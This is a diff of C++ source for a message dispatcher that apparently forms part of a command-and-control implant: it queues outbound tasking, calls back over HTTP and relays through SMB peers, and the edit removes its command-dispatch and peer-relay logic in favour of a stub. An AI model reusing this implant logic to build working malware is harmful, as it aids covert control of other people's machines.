@@ -1,7 +1,7 @@
 #include <core/include/dispatch.hpp>
 namespace Dispatcher {
 
-    BOOL PeekPID(const _stream *const stream) {
+    BOOL PeekPeerId(const _stream *const stream) {
         HEXANE
 
         uint32_t pid = 0;
@@ -136,11 +136,8 @@ namespace Dispatcher {
         }
     }
 
-    BOOL PackageQueueItem(_stream *out) {
+    BOOL PrepareQueue(_stream *out) {
         HEXANE
-
-        // todo: refactor this to work with the new queue process
-        // maybe tag message in/out (0/1)?
 
         _stream *head   = Ctx->transport.outbound_queue;
         _parser parser  = { };
@@ -189,22 +186,20 @@ namespace Dispatcher {
         _stream *out    = Stream::CreateStream();
         _stream *in     = { };
         _stream *head   = { };
-        _stream *swap   = { };
 
         retry:
         if (!Ctx->transport.outbound_queue) {
 
 #if     defined(TRANSPORT_SMB)
-            // todo: this will fail infinitely on smb as no new messages will be read in
             return_defer(ERROR_SUCCESS);
 #elif   defined(TRANSPORT_HTTP)
-            PSTREAM entry = Stream::CreateStreamWithHeaders(TypeTasking);
-
+            auto entry = Stream::CreateStreamWithHeaders(TypeTasking);
             OutboundQueue(entry);
+
             goto retry;
 #endif
         } else {
-            if (!PackageQueueItem(out)) {
+            if (!PrepareQueue(out)) {
                 return_defer(ntstatus);
             }
         }
@@ -212,33 +207,13 @@ namespace Dispatcher {
 #if     defined(TRANSPORT_HTTP)
         Network::Http::HttpCallback(out, &in);
 #elif   defined(TRANSPORT_PIPE)
-        Network::Smb::PeerConnectEgress(out, &in);
+        Network::Smb::SmbSend(out);
 #endif
 
         Stream::DestroyStream(out);
-        out = nullptr;
 
         if (in) {
-            ClearQueue(); // todo: do not clear the queue, just remove n entries that succeeded
-
-            if (PeekPID(in)) {
-                CommandDispatch(in);
-                Stream::DestroyStream(in);
-
-            } else {
-                swap = in;
-                in = out;
-                out = swap;
-
-                if (Ctx->peers->ingress_name) {
-                    Network::Smb::PeerConnectIngress(out, &in);
-
-                    if (in) {
-                        OutboundQueue(in);
-                    }
-                }
-                Stream::DestroyStream(out);
-            }
+            // todo: refactor again
         } else {
             head = Ctx->transport.outbound_queue;
             while (head) {
